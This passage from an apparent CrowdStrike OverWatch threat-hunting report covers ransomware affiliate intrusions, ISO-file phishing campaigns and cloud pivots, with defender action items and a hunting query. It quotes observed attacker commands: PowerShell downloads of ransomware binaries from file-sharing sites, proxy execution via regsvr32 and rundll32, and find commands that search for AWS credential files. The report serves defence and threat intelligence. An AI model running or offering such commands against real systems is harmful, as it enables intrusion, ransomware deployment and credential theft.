to discover the context and notify the customer, and the\n\nFalcon platform blocked known bad indicators.\n\nThe breadth of endpoint data collected and analyzed by the CrowdStrike Security Cloud\n\nled to not only the rapid discovery of this activity by threat hunters, but also the rapid\n\nidentification that they were dealing with Phobos affiliate tradecraft.\n\nPhobos affiliate activity generally involves the exploitation of external services to gain\n\naccess to accounts with weak credentials. This is typically followed by attempts to install a\n\nrange of tooling used for performing reconnaissance, credential access and modification\n\nof security controls prior to ransomware execution.\n\n###### Action Items for Defenders\n\nReview command line and process arguments for applications initiating registry\n\nchanges. Adversaries will actively modify settings to bypass controls and enable further\n\nmalicious activity. This could include modifying or adding keys associated with security\n\ntechnologies or autostart locations. Any WDigest values being set to “1” could indicate an\n\nadversary preparing to steal credentials.\n\nBe suspicious of activity originating from non-standard locations. Adversaries routinely\n\nuse non-standard directories to stage or execute their files or store the output of their\n\ntooling. Monitor for the download and execution of scripts from non-standard locations.\n\nAny associated requests that include obfuscated or encoded command lines may be a sign\n\nthat the adversary is attempting to acquire binaries covertly.\n\nAudit external services to identify internet-accessible entry points. Adversaries,\n\nincluding Phobos affiliates described in this case study, will attempt to exploit any external\n\nservices. If services are improperly configured, this could allow an adversary an easy\n\nfoothold into the environment. Any user accounts with weak credentials could be low\nhanging fruit for adversaries to exploit and operate beneath.\n\n25 [For more on the SEARCH methodology, see https://www.youtube.com/watch?v=YxcnI_ZjQAA and https://](https://www.youtube.com/watch?v=YxcnI_ZjQAA)\n\n\n-----\n\n###### INITIAL ACCESS\n\nAffiliate\ndiscovered\noperating over\nScreenConnect\nremote access\nsoftware COMMAND AND CONTROL\nAffiliate uses\nPowerShell to acquire\nALPHV binaries from\nmultiple public filesharing sites and store\nthem into the \\PerfLogs\ndirectory\n###### PERSISTENCE\nAffiliate creates a\nnew account and\nassigns it to domain\nadmin group\n\n###### IMPACT\nAffiliate makes\nattempts to delete\nvolume shadow\ncopies — this is\nblocked by the\nFalcon platform\n\n\n###### OverWatch Identifies Interactive ALPHV Affiliate\n\nIn another recent intrusion in the healthcare industry, OverWatch\n\nuncovered RaaS activity by an affiliate of the ALPHV ransomware\n\n(also known as BlackCat). OverWatch uncovered the early stages\n\nof this intrusion after seeing suspicious activity under the service\n\naccounts of three Windows systems. The adversary was operating\n\nover ScreenConnect remote access software, and OverWatch quickly\n\npicked up on suspicious reconnaissance and tool transfer activity. The\n\nadversary used PowerShell to acquire ALPHV binaries from multiple\n\npublic file-sharing sites and store them into the \\PerfLogs directory.\n\npowershell Invoke-WebRequest -Uri ‘https[:]//\nfiletransfer[.]io/data-package/L8pJUgcE/download’\n-OutFile C:\\PerfLogs\\HillSouthInYourMouth.exe\n\npowershell Invoke-WebRequest -Uri\n‘https[:]//wetransfer[.]com/downloads/\ne43s1a1864198f6cc9dd99df3f77d0820220469150915/bff4f7’\n-OutFile C:\\PerfLogs\\hi3.exe\n\nNext, the adversary executed one of these ALPHV binaries, which carried\n\nout a number of operations that OverWatch recognized as inline with\n\npre-ransomware activity. These included the creation of a new user\n\naccount, which was then added to the administrators permission group to\n\nfacilitate persistent access. Following this were attempts to delete volume\n\nshadow copies; however, the Falcon platform prevented these attempts\n\nfrom succeeding. This popular eCrime technique is employed to inhibit\n\nrecovery from auto-backups with the goal of amplifying the pressure on\n\nvictims to meet ransom demands.\n\n|Col1|Col2|\n|---|---|\n|CCESS ffiliate vered g over nnect cess tware||\n||COMMAN Affiliate u PowerS ALPHV multiple sharing s them int director|\n|ENCE tes a t and main roup||\n||IMPACT Affiliate attempt volume copies blocked Falcon|\n\n\n-----\n\nWININIT.EXE\n\n\nSERVICES.EXE\n\n– +\n\n...ENTSERVICE.EXE\n\n– +\n\nCMD.EXE\n\n– ...NYOURMOUTH.EXE\n\nCMD.EXE\n\n+ +\n\n–\n\nCMD.EXE\n\n– +\n\nCMD.EXE\n\n+ +\n\nCMD.EXE\n\n+ +\n\nCMD.EXE\n\n+ +\n\n**Figure 6.

Making this change enables the adversary to prevent\n\nremote file access issues when distributing the ALPHV ransomware binary across multiple\n\ndevices, allowing them to deploy ransomware more rapidly.\n\nOverWatch threat hunters also picked up on another trait of this ransomware, which\n\nindicated its association with ALPHV. During execution of the ALPHV file, an access\n\ntoken was supplied that was necessary for it to execute properly. This token is a unique\n\nkey that identifies the victim and is used by the victim when they navigate to the .onion\n\npayment site referenced within the ransom file.\n\nC:\\PerfLogs\\HillSouthInYourMouth.exe --access-token <UNIQUE ACCESS\nTOKEN>\n\nDue to OverWatch’s early identification of this pre-ransomware activity, the victim\n\norganization was able to remediate affected hosts before the adversary could achieve\n\nmission objectives. Following the intrusion, OverWatch worked closely with the customer\n\nto analyze the associated binaries, which were confirmed to be associated with ALPHV.\n\nOverWatch continues to see ALPHV affiliates performing BGH operations, and it is\n\nimportant to understand their TTPs to identify these adversaries in the early stages,\n\nb f ti t k l\n\n\n-----\n\n###### Action Items for Defenders\n\nReview creation of new accounts and audit accounts with administrative\n\nprivileges. Adversaries will leverage local accounts and create new domain accounts\n\nas a means to remain persistent. By providing new accounts with elevated privileges,\n\nthe adversary gains capabilities and another way to operate covertly. Service\n\naccount activity should be audited, restricted to only permitted access to necessary\n\nresources, and should have regular password resets to limit the attack surface for\n\nadversaries looking for a means to operate beneath.\n\nMonitor for attempts to impact recovery efforts. Adversaries will use techniques such\n\nas deleting volume shadow copies, modifying the boot loader or tampering with the\n\nWindows backup catalog to inhibit recovery after a ransomware intrusion. This activity\n\nis indicative of imminent ransomware execution. It is advisable to have processes and\n\nprocedures in place so that defenders can act quickly and decisively upon discovering or\n\nbeing notified of a potential ransomware intrusion.\n\nAny remote access tooling should be routinely audited. Adversaries will leverage\n\nany pre-existing remote access tooling at their disposal or attempt to install legitimate\n\nremote access software in the hope that it evades any automated detections. Regular\n\naudits should check to see if the tool is authorized and if the activity falls within an\n\nexpected timeframe, such as within business hours. Connections made from the same\n\nuser account to multiple hosts in a short timeframe may be a sign that an adversary has\n\ncompromised credentials and is extending their foothold.\n\n\n-----\n\n###### A Word on Affiliates\n\nThe healthcare sector continues to be a high-value target for ransomware affiliates. While\n\nsome RaaS programs have precluded their affiliates from targeting the healthcare sector,\n\nthere remain several programs that have not, Phobos among them. The healthcare sector\n\nshould remain on high alert for ransomware activity and implement proactive security\n\nmeasures to stay ahead of affiliates.\n\nDue to the nature of eCrime affiliate models, the sophistication of attackers may vary,\n\nand so the tradecraft prior to ransomware execution may differ greatly. It is also likely that\n\nthe ransomware payload will be compatible with various OS platforms. This means that\n\norganizations need a threat hunting team that can recognize a wide range of pre-ransomware\n\ntradecraft, or should consider partnering with a vendor that can provide immediate capability\n\nuplift with a skilled and mature hunting program.\n\nA common entry point for affiliates is through exploiting vulnerable external services or user\n\naccount credentials. However, it is not uncommon to see adversaries exploiting emerging\n\nvulnerabilities or relying on access brokers to do the legwork — this is especially concerning\n\nbecause eCrime groups can effectively buy access to an environment and then leverage\n\nRaaS toolkits for ransomware deployment.\n\nRaaS models also open up the ever-present threat of data extortion by the eCrime affiliates\n\nthreatening to leak or sell data to improve their chances of being paid. A technique some\n\naffiliates use, dubbed “double extortion,” involves the exfiltration of data prior to ransomware\n\ndeployment to gain more leverage when they demand payment. These are not just empty\n\nthreats — RaaS operators provide dedicated leak sites and community support for their\n\naffiliates to use if needed.\n\nCrowdStrike Intelligence has recently assessed that although Phobos variants are still in use,\n\nits affiliates are likely beginning to move toward ALPHV and AvosLocker RaaS programs,\n\nwhich offer larger and more dedicated teams. This shift is an example of the beating heart of\n\nthe eCrime underground, as these adversaries continuously seek the most effective means\n\nto exploit an organization and generate revenue.\n\nWith RaaS affiliate models attracting greater numbers of eCrime adversaries and lowering\n\nthe barrier to entry, the intrusion landscape is starting to represent a substantial risk for\n\norganizations regardless of their sector or size. It is important now more than ever to harness\n\nyour people, processes and technology and to proactively hunt threats to identify these\n\nadversaries before they can cause significant damage.\n\n\n-----\n\n###### Healthcare Observables\n\nAcross the reporting period (July 2021-June 2022), OverWatch observed various\n\n\nadversaries targeting the healthcare sector. These adversaries leaned heavily on\n\ndefense evasion tradecraft to subvert defenses and operate covertly, including making\n\nconfiguration changes to tooling and registry settings. Adversaries were also frequently\n\nobserved using valid accounts and remote service tooling to move laterally, and creating\n\nnew user accounts to maintain persistence. Other common techniques involved the use of\n\nnative tooling to enumerate local files, user accounts, hosts and network shares. Below are\n\nthe adversaries that OverWatch observed targeting the healthcare sector and the top 10\n\ntools observed in intrusions against the sector over the reporting period.\n\n###### Top 10 Tools Uncovered in Interactive Intrusion Attempts in the Healthcare Sector\n\n Adversaries Operating in the Healthcare Sector\n\n PROPHET SPIDER\n\n NEMESIS KITTEN\n\n UNKNOWN PANDA\n\n UNKNOWN SPIDER\n\n CYBORG SPIDER\n\n FRONTLINE JACKAL\n\n\n-----\n\n###### Verticals Discussed in This Feature:\n\n Government\n\n Media\n\n Manufacturing\n\n Technology\n\n\n###### Out with the Old,\n In with the ISO:\n How Adversaries Have Adapted to the Retirement of the Macro\n\nWhile adversaries continue to innovate their tactics to remain under\n\nthe radar, tried and true techniques such as phishing remain popular\n\namong targeted and eCrime operators alike. OverWatch has observed a\n\nresurgence in phishing attacks specifically leveraging ISO files for delivery\n\nof malicious software. While approximately 75% of these observed\n\nattacks were attributed to eCrime adversaries, targeted intrusion actors\n\nwere also observed leveraging this technique.\n\nWhile not a novel technique, the uptick in threat actors using ISO\n\nfiles in their phishing attempts is a new trend that OverWatch has\n\nbeen monitoring closely. CrowdStrike Intelligence has assessed that\n\nadversaries began making the shift to using ISO files in response\n\nto Microsoft’s announcement that it would begin disabling internet\nenabled macros in Office documents by default.\n\nOverWatch observed malicious actors already adapting their\n\noperations well ahead of the planned patches that began rolling out\n\nin April 2022, with an increase in ISO delivery starting in late 2021/\n\nearly 2022. This modus operandi has impacted the technology,\n\nhealthcare, mining and media verticals particularly — but has been\n\nseen sporadically throughout many other verticals.\n\n\n###### What Is an ISO File?\n\nISO 9660 is the standard file system for CD-ROMs. This international standard\ngave rise to the term “ISO-image,” which is essentially a digital copy of a disc,\nincluding a full and intact file structure. ISO-images are widely used today to\ndistribute large programs or software to include operating systems. ISO-images\ncan be mounted by use of a virtual optical disk drive, which can then be interacted\nwith as if it were an actual physical disk.\n\n\n-----\n\n###### COZY BEAR Spearphishes Government Entities WorldWide with ISO File Surprise\n\nHKEY_CURRENT_USER\\SOFTWARE\\JavaSoft\\Ver2\n\nContains\n\nCobalt Strike\n\n\nWrites\nshellcode in\n\nContains Contains\n\nCovid_information.html Covid.iso Covid.hta\n\nWrites\nPowerShell in\n\n\nC2\n\nLoader for\n\n**www**\n\nhttps[:]//midcitylanews[.]com:433/news/update/aaa\n\nRedirects to\n\n**www**\n\nhttps[:]//midcitymessenger[.]com//\n\n\nHKEY_CURRENT_USER\\SOFTWARE\\JavaSoft\\Ver\n\n**Figure 7. Malicious ISO file leads to deployment of Cobalt Strike Beacon and C2 communication**\n\nBeginning in Q4 2021, COZY BEAR initiated a new wave of phishing observed by\n\nOverWatch as early as December 2021 and as recently as March 2022. Threat hunters\n\nidentified the Russian threat actor delivering a malicious ISO image file (Covid.iso)\n\nembedded into an HTML file (Covid_information.html) via email. Further analysis by\n\nthe CrowdStrike Intelligence team found that the image file contained an HTA file\n\n(Covid.hta). This HTA file contained malicious VBScript (VBS) that created two registry\n\nvalues — including a PowerShell loader script and Base64-encoded shellcode.\n\nFurther analysis by CrowdStrike Intelligence showed that a new instance of PowerShell\n\nwas spawned by the HTA file, which in turn executed the previously stored loader script,\n\npointing it toward the shellcode. The shellcode ultimately led to Reflective Code Loading\n\nactivity, allowing for a Cobalt Strike beacon to be deployed. The beacon payload was\n\ndesigned with command-and-control (C2) configurations in an attempt to receive\n\nadditional instructions and perform further malicious operations on the targeted system.\n\n\n-----\n\n###### WIZARD SPIDER’s BazarLoader Delivered in ISO Files\n\nAlso in Q4 2021, OverWatch observed a campaign leveraging ISO files to\n\ndeliver WIZARD SPIDER’s BazarLoader. BazarLoader is a downloader\n\nand backdoor that is typically used to perform post-exploitation and pre\nransomware activity on a compromised system.\n\nIn one notable intrusion from this campaign, threat hunters observed\n\na targeted user fall victim to a successful phish where the following\n\nmalicious link was clicked on:\n\nhttps[:]//www.transfernow[.]net/dl/202110088o9UcfuH/\nSQNv3wqD\n\nFollowing a successful DNS query and connection to the C2 server,\n\nthreat hunters observed host activity where VLC media player (vlc.exe)\n\nexecuted a downloaded ISO image (Documents.iso), as outlined in the\n\nbelow command-line sample:\n\n“C:\\Program Files\\VideoLAN\\VLC\\vlc.exe” --started-from-file\n“C:\\Users\\[REDACTED]\\Downloads\\Documents.iso”\n\nUpon execution of the ISO file, a Windows shortcut file (Documents.lnk)\n\nwas created. This LNK file in turn pointed toward a malicious\n\nDLL file (1.dll) that was executed under the native Windows binary\n\nrundll32.exe­ . Further analysis revealed that this DLL file’s SHA256\n\nhash was that of a BazarLoader binary.\n\n\n-----\n\n###### LUNAR SPIDER’s BokBot Delivered Using ISO Files\n\nIn early 2022, OverWatch threat hunters observed a campaign\n\ndelivering LUNAR SPIDER’s BokBot trojan. The characteristics of this\n\ncampaign bore a strong resemblance to similar campaigns observed\n\nthroughout 2021.\n\nBokBot, a downloader tracked by CrowdStrike Intelligence, has two\n\ncomponents: a first-stage loader and core loader. The purpose of\n\nthese loaders is to obtain the core banking module from a C2 server.\n\nIn this specific intrusion, BokBot was delivered through the abuse of\n\nISO files.\n\nPhishing emails were delivered to victims containing an external\n\nURL link — sampled below — that would allow for the download of a\n\npassword-protected ZIP file.\n\nhttp[:]//nelionexports[.]in/satirizing.php\n\nThe ZIP file (report-0222530.zip) contained an ISO image\n\n(doc_1138.iso) that was mounted to disk under \\Device\\CdRom0.\n\nEmbedded within the disk image was a Windows shortcut LNK file\n\n(documents.lnk). In parallel, the ISO image also housed a suspicious\n\nDLL with the naming convention of data.dll. This DLL was then\n\nexecuted by the previously mentioned LNK file, which also leveraged\n\nWindows native binary regsvr32.exe in an attempt to evade defenses\n\nby way of system binary proxy execution.\n\n“C:\\Windows\\System32\\cmd.exe” /c start regsvr32.exe\ndata.dll\n\nAdversary attempts to evade defenses using Windows native binary\n\nUpon execution of the aforementioned data.dll binary, a connection\n\nwas initiated to a known BokBot domain (hdtrenity[.]com) in the\n\nattempt to ultimately obtain and download the BokBot downloader.\n\n\n-----\n\n###### Shindig and Cobalt Strike Delivered via ISO Phishing\n\nDuring Q2 2022, OverWatch threat hunters observed ISO image files\n\nbeing abused in an intrusion by a suspected ransomware-as-a-service\n\n(RaaS) affiliate in an attempt to deploy the Shindig downloader and\n\ndeliver Cobalt Strike. After a successful phishing attempt, OverWatch\n\nthreat hunters observed a connection to domain fromsmash[.]com —\n\na domain to the Smash file-sharing service. According to CrowdStrike\n\nIntelligence, this domain has been publicly reported as being used for\n\nthe distribution of Shindig.\n\nThreat hunters discovered that the ISO image (mounted under\n\n​\\Device\\CdRom0\\) contained a Windows shortcut file\n\n(New Folder.lnk) and DLL (service.dll) that was later identified\n\nas Shindig. Upon opening, the LNK file was spawned, which in turn\n\nleveraged Rundll32.exe to execute the Shindig binary, as sampled\n\nbelow:\n\n“C:\\Windows\\System32\\rundll32.exe”\nservice.dll,UxRSYlmZxw\n\nFollowing execution of the malicious Shindig binary, Cobalt Strike\n\nwas injected into the native Windows process wabmig.exe. Shortly\n\nafter, OverWatch threat hunters observed batch files (adf.bat and\n\nad.bat) relating to ADfind, an Active Directory enumeration tool.\n\nThis combination of activity stemming from Shindig, Cobalt Strike\n\nand ADfind is consistent with access broker groups facilitating RaaS\n\noperations, according to CrowdStrike Intelligence.\n\n\n###### What is Shindig?\n\nShindig (also known publicly as Bumblebee), is a downloader used for distributing\nand executing malicious payloads such as Cobalt Strike. Shindig is growing\nin popularity and has been observed being used by many adversary groups\nacross the eCrime ecosystem. The developers of Shindig continue to add new\nfunctionality and improve implementation to evade detection. This downloader\ncan be indicative of pre-ransomware activities.\n\n\n-----\n\n###### CrowdStrike Customers\n\n If you are running the most recent Falcon sensor version, or any version after 6.40, you have the opportunity to take advantage of this new field. To search for mounted Virtual Drives in your environment, run the following query in your Falcon > Investigate > Event Search module.\n\n\n###### OverWatch Remains Vigilant Against ISO Phishing Attempts\n\nOverWatch remains committed to honing its ability to identify adversary\n\nbehaviors and improving its hunting processes. Through the analysis\n\nof these ISO phishing attempts, OverWatch partnered with the Falcon\n\nproduct team to increase the capabilities of the Falcon sensor to expand\n\nsensor coverage and improve OverWatch’s visibility — enabling them to\n\nhunt for these types of malicious activities and others more effectively.\n\nIn addition to ISO files, OverWatch observed adversaries use LNK, MSI\n\nand XLL file types in their phishing attempts. Adversaries are diversifying\n\ntheir phishing toolkits with the understanding that no one technique\n\ncan be solely relied upon — rather, multiple tools and techniques are\n\nnecessary to ensure the best chance of gaining access to today’s\n\nhardened environments. OverWatch is aware of this and is continuously\n\nimproving its hunting operations to unearth all malicious, hands-on\nkeyboard activity.\n\n###### Action Items for Defenders\n\nWhenever possible, OverWatch strives to empower its customers\n\nto hunt with Falcon. The following provide examples of Event Search\n\nqueries that you can run to hunt for ISO files in your environment.\n\n[OverWatch recommends leveraging the Falcon console documentation](https://falcon.crowdstrike.com/login/?next=%2Fdocumentation%2F12%2Fhunting-and-investigation)\n\nto discover more queries that can aid with hunting and investigations\n\nwithin the Falcon console.\n\nHunt for ISO files with Falcon in your environment. Leveraging the existing\n\nevent types of FsVolumeMounted, RemovableMediaVolumeMounted and\n\nSnapshotVolumeMounted, Falcon engineers added new field types to\n\nidentify when virtual disks are mounted in the Windows operating system.\n\nFalcon can now identify when the OS mounts ISO, VHD and VHDX files. It will\n\nalso provide the associated file name, giving analysts and hunters improved\n\nvisibility into any activity that results in virtual files mounted on the system.\n\n\n-----\n\n###### Hunt for mounting of suspicious ISO images:\n\nevent_platform=win event_simpleName IN (FsVolumeMounted,\n\nRemovableMediaVolumeMounted, SnapshotVolumeMounted)\n\nVirtualDriveFileType_decimal=1\n\n| rex field=VirtualDriveFileName “(?i).*\\\\\\(?<isoName>.*\\.(ISO\\|IMG))”\n\n| table ContextTimeStamp_decimal, aid, ComputerName,\n\nVolumeDriveLetter,VolumeName, isoName, VirtualDriveFileName\n\n| rename ContextTimeStamp_decimal as endpointSystemClock, aid as\n\nagentID,ComputerName as computerName, VolumeDriveLetter as driveLetter,\n\nVolumeName as volumeName, VirtualDriveFileName as fullPath\n\n| convert ctime(endpointSystemClock)\n\n\n-----\n\n###### Be an Active Partner to Get the Most from Your OverWatch and Falcon Subscription\n\nAdversary activity does not conform to standard business hours, which is why OverWatch\n\nhunts around-the-clock to identify the earliest possible signs of malicious activity and notify\n\n\ncustomers. However, it is crucial for victim organizations to understand that OverWatch\n\nnotifications warrant a quick and decisive response. Moreover, it is advisable to have\n\nprocesses in place to respond. The ability to respond effectively and efficiently to an\n\n\nOverWatch notification is valuable, as the organization in this scenario quickly learned.\n\nEarlier this year, OverWatch observed an adversary use the legitimate PsExec utility to\n\n\nconnect to a host within the victim’s environment. This activity originated from a host in the\n\nmulti-vendor environment in a segment where the Falcon sensor was not deployed. Once\n\nconnected, the adversary enumerated local user accounts, queried other logged-in users\n\nand reset the password for the privileged local Administrator account.\n\n\nWhile it is common knowledge that reusing passwords is bad cyber hygiene, this adversary\n\ndecided to tempt fate, reusing a distinctive password when changing the account\n\n\npassword. OverWatch had seen the exact same password used in another confirmed\n\nintrusion attempt, and therefore notified the victim organization with high confidence that\n\n\nthere was malicious, ongoing hands-on-keyboard activity in their environment that required\n\nimmediate action.\n\n\nOverWatch’s timely notification prompted the victim organization to expedite the\n\ndeployment of additional Falcon sensor coverage across their environment — ensuring\n\n\nfull visibility and enabling thorough analysis by OverWatch threat hunters. The victim\n\norganization also quickly network-contained the affected hosts to prevent any further\n\n\nlateral movement.\n\nThis is exactly the type of partnership OverWatch aims to have with its customers. Quick\n\n\nresponse times and a two-way flow of information limit the potential damage that an\n\nadversary can do. It also enables deep analysis by our threat hunters to provide a full\n\npicture of an adversary’s movements, which better positions OverWatch to support\n\nvictim organizations’ remediation efforts. This organization’s ability to quickly address the\n\n\nidentified blind spots in their endpoint coverage is a great example of the proactive security\n\nposture that all defenders should enact in their own environment.\n\n\n-----\n\n###### Looking Ahead\n### OverWatch Showcases the Future of Threat Hunting\n\nChange is the only constant in the world of threat hunting —\n\nand the only way to stay ahead of the adversary is to adapt.\n\nOverWatch continually develops its technology and capability to\n\nadapt to shifts in adversary activity.\n\nAll signs point to the fact that adversaries are following the\n\nincreasing trend in cloud adoption and are quickly building\n\ntheir capability to navigate and exploit cloud workloads — but\n\nOverWatch’s hunters are right there with them. OverWatch is\n\nactively building out its cloud hunting capabilities.\n\nThe work that OverWatch’s expert threat hunters do to protect\n\nvictim environments around the clock would not be possible\n\nwithout the innovative technology that enables hunters to quickly\n\nzero-in on suspicious telemetry. In the past year, OverWatch has\n\nbeen awarded five patents in recognition of this technology that\n\nmakes human-driven threat hunting a scalable solution.\n\n.\n\n\n-----\n\n###### OverWatch Takes to the Sky: Hunting for Adversaries in the Cloud\n\nAdversaries continue to adapt to the evolving world of cloud technology and are actively\n\nseeking to capitalize on the opportunity it presents to exploit gaps in an organization’s\n\ndefenses. While organizations globally look to the cloud to aid with business objectives,\n\nsuch as scalability, adversaries view the cloud as yet another arena to pursue their quest for\n\nintellectual property theft, data extortion, ransomware or simple destruction. This makes\n\nfor an increasingly expansive and complex attack surface for defenders to manage.\n\nFor customers looking to increase visibility and coverage of their cloud-based resources\n\nwith CrowdStrike Cloud Security, OverWatch now delivers proactive threat hunting\n\ndedicated to continuously uncovering hidden and advanced threats originating, operating\n\nand persisting in cloud environments. Falcon OverWatch Cloud Threat Hunting™ applies\n\nthe same systematic and comprehensive hunting methodology and leverages the\n\nadded telemetry delivered by CrowdStrike Cloud Security to achieve visibility into cloud\n\nenvironments and identify the early stages of adversary activity.\n\nFor organizations without CrowdStrike Cloud Security, OverWatch still has some visibility\n\nof cloud-based threats. Traditional information technology (IT) assets in organizations\n\nremain a gateway to the cloud, interacting heavily with the management of cloud\n\ninfrastructure. To exploit cloud assets, adversaries may first access traditional IT assets\n\nto pivot to applications, systems and/or data processed in the cloud. The following case\n\nstudies highlight examples where OverWatch observed adversaries doing just that.\n\n\n-----\n\n###### Adversary Pivots from Traditional Endpoint to AWS Cloud Resources\n\nIn Q4 2021, OverWatch discovered an unknown PANDA adversary\n\noperating on multiple Linux hosts in the environment of a gaming\n\norganization. The adversary’s initial actions included unusual network\n\nconnectivity checks and other host reconnaissance commands that are\n\nfrequently observed by OverWatch and that, as a result, stood out to the\n\nthreat hunters. The adversary attempted to gather information about the\n\nhosts and the environment, discover additional credentials and establish\n\ngreater persistence to the hosts. The adversary then discovered that\n\none of the compromised hosts had access to the victim organization’s\n\nAmazon Web Services (AWS) console environment. Knowing they\n\ncould access the AWS console environment via the AWS command\n\nline interface, the adversary quickly changed their focus and began to\n\nperform extensive discovery commands using the AWS command line\n\ninterface and EC2 Instance Connect.\n\n\n###### A Bit About Securing AWS\n\nThe AWS command line interface was developed by Amazon to provide customers with a\n\nmechanism to automate the management of AWS services. Access to use the AWS command\n\nline interface requires that accounts be configured with an access key in Identity and Access\n\nManagement (IAM), and have a key ID and secret access key assigned to it. This is set in the user’s\n\nhome directory in the .aws/credentials file. This file is a simple text file and can be viewed by\n\nanyone with access to an account’s home directory. The ID and key are set as shown in the example\n\nbelow.\n\n[default]\n\naws_access_key_id=ABCDEFG12345…\n\naws_secret_access_key=a1b2c3d4e5f6…\n\nAs a result, it is critical to only grant AWS accounts the privileges they need and not grant overly\n\npermissive access. Anyone who accesses the account can steal this information for use on\n\nadversary infrastructure or can use it directly on a compromised host.\n\n\n-----\n\nThe adversary used the aws command to query for metadata on all EC2 instances in the environment, which included\n\ninformation about security groups, network configuration and identifiers associated with each host. They also queried for\n\nthe password security policy that had been configured in IAM for the victim’s AWS environment. A sample of the commands\n\nobserved by OverWatch are as follows:\n\n|Command|Purpose|\n|---|---|\n|aws iam ls aws iam list|Issues invalid commands, possibly intended to list users in IAM|\n|aws ec2 describe-instances|Displays metadata about all EC2 instances|\n|aws configure list|Displays information about the AWS access key id and secret key|\n|aws ec2 list-instances|Issues invalid command in the attempt to list EC2 instances|\n|aws iam get-account-password-policy|Returns the password policy set for IAM accounts|\n|aws sts get-caller-identity|Displays information about the IAM user or role used to call the operation|\n|aws ec2 describe-regions --debug|Returns information about the AWS regions available to the account|\n|aws ssm describe-instance-information|Displays configuration information about the IAM user that executed the command|\n|aws iam get-role-policy|Displays the policy for the IAM role associated with an account|\n|aws iam get-user|Displays information about the IAM user associated with the access key ID|\n|aws s3 ls|Displays S3 objects associated with the account|\n|find / -name .aws find / -name credentials|Discovery commands intended to locate files containing AWS access key IDs and secret keys|\n\n\n-----\n\nThis intrusion clearly highlights how an adversary can use the tools and credentials\n\navailable on an endpoint to begin their reconnaissance of the objects under the control\n\nof the AWS control panel and APIs. The adversary in this instance reviewed the contents\n\nof configuration files for AWS, Jenkins, Docker, Ansible and other applications used to\n\nmanage and scale the cloud and container environments.\n\nThis telemetry has long been a part of OverWatch’s hunting leads. The launch of\n\nOverWatch’s cloud hunting capabilities extends the power of threat hunting to include\n\nunique cloud-based indicators of attack (IOAs) such as control plane and serverless\n\nvulnerabilities, misconfigurations, application behavior anomalies, container escapes,\n\nprivilege escalations, node compromises and more.\n\n###### CrowdStrike Incident Response Services Uncovers Adversary Actions in Azure Cloud Infrastructure\n\nAdversaries are not limited to any one cloud service provider. In Q1 2022, the CrowdStrike\n\nIncident Response team was contacted by a victim organization that had discovered a\n\ncompromise of their Microsoft 365 (M365) environment and needed help to remove the\n\nadversary’s access from their environment and understand how the intrusion took place.\n\nThe adversary gained initial access to the environment via an exploitation of an internet\nfacing service. They then performed extensive reconnaissance of the organization’s\n\nenvironment that included enumeration of hosts and accounts associated with the\n\nmanagement of the on-premises single sign-on (SSO) application, as well as members\n\nof Active Directory groups that have privileged access to the organization’s Azure tenant.\n\nSpecifically, the adversary targeted members and systems used by email administrators\n\nwho typically have elevated access within M365. Ultimately, this led to the discovery of on\npremises domain accounts that also had the Global Administrator role assigned within the\n\norganization’s Azure tenant.\n\n\n-----\n\nThe organization configured its SSO solution with Integrated Windows\n\nAuthentication (IWA), which would allow a domain authenticated user to\n\nautomatically access SSO-managed applications through an opened\n\nweb browser without being prompted for reauthentication or multifactor\n\nauthentication (MFA) in select cases.[26] The adversary abused this design\n\nto bypass configured Conditional Access Policies that would normally\n\nprevent direct access from external IP addresses. This was accomplished\n\nby targeting the sessions of previously identified Global Administrator\n\naccounts followed by performing cookie theft of the established SSO\n\nsession from the web browser on an internal system. This was followed by\n\nreplaying the session from their own infrastructure to gain access to the\n\nvictim M365 environment.\n\nOnce the adversary gained access to the organization’s M365\n\nenvironment, they modified existing content searches within Microsoft\n\nPurview (formerly known as Microsoft 365 Compliance) to perform\n\ndiscovery for data of interest and blend in with normal business activity.[27]\n\nBy default, accounts with Global Administrator roles are not provided\n\nwith the necessary permissions to perform compliance-related\n\nfunctions, such as creation of new eDiscovery content searches.\n\nHowever, users with Global Administrator roles can add any new roles\n\nto any accounts. In this case, the adversary added the account they\n\nleveraged to gain access to the M365 environment to the eDiscovery\n\nAdministrator group.\n\nOnce the adversary provisioned the necessary access to create content\n\nsearches, they created and executed content searches for data of interest\n\nthat included mailbox contents of executives within the organization. Once\n\nthe content searches were complete, the adversary exported the results\n\ndirectly from M365 to their own infrastructure — thus bypassing traditional\n\nmethods of exfiltration detection based on egress network telemetry as the\n\ndata never directly traversed the victim organization’s network.\n\nFinally, the adversary attempted to cover their tracks by removing\n\ncreated content searches from the Microsoft Purview console. This\n\nintrusion is another example of how proficient adversaries are in\n\noperating in hybrid environments to accomplish their objectives.\n\n26 [https://docs.microsoft.com/en-us/aspnet/web-api/overview/security/](https://docs.microsoft.com/en-us/aspnet/web-api/overview/security/integrated-windows-authentication)\n[integrated-windows-authentication](https://docs.microsoft.com/en-us/aspnet/web-api/overview/security/integrated-windows-authentication)\n\n27 [https://docs.microsoft.com/en-us/microsoft-365/compliance/](https://docs.microsoft.com/en-us/microsoft-365/compliance/microsoft-365-compliance-center)\n\n\n-----\n\n###### Action Items for Defenders\n\nThese intrusions are examples of the focus adversaries are putting on assets processed\n\nand stored in cloud resources. Adversaries have demonstrated their ability to operate\n\nin complex environments — regardless of whether they consist of traditional endpoints,\n\ncloud environments or a hybrid of both. OverWatch has a lengthy history of hunting for\n\nadversary activity in cloud-hosted resources. The recent announcement of OverWatch\n\nperforming hunts for adversaries within the cloud management services is the extension\n\nof this experience to find adversaries regardless of where they are operating in cloud\n\nenvironments.\n\nInvest in learning to harden, monitor and defend against attacks against cloud\n\nresources. The benefits of cloud computing in regard to scalability, robust technology\n\nofferings and physical security come with a price — greater complexity in managing the\n\nsecurity of these environments. For example, even if MFA is configured for some cloud\n\nservices, these same services may not require MFA when accessed via a different service\n\nURL. Defenders must understand these interactions and monitor them accordingly.\n\nDo not assume the default security settings are the best settings for your organization.\n\nCloud service providers offer a number of different mechanisms for increasing the security\n\nof a given service, but they also give their customers the freedom to decide whether to\n\nenable these mechanisms or not. Organizations must understand what the available\n\nsecurity controls are and not assume that the service provider has applied default settings\n\nthat are appropriate for them.\n\n\n-----\n\n###### OverWatch’s Patented Technology Delivers Inimitable Threat Hunting Capability\n\nThreat hunting is frequently misunderstood. It is not a reactive monitoring function, nor is it a\n\nremediation service. Threat hunting is proactive threat detection that sits at the intersection\n\nof people, process and technology — it draws on the strength of each to outmaneuver\n\nsophisticated adversary activity designed to evade automated detections.\n\nThe expertise of OverWatch’s threat hunters and the strength of OverWatch’s systematic\n\nhunting methodology, SEARCH[28], has been well established over the years. But the\n\npowerful technology that enables 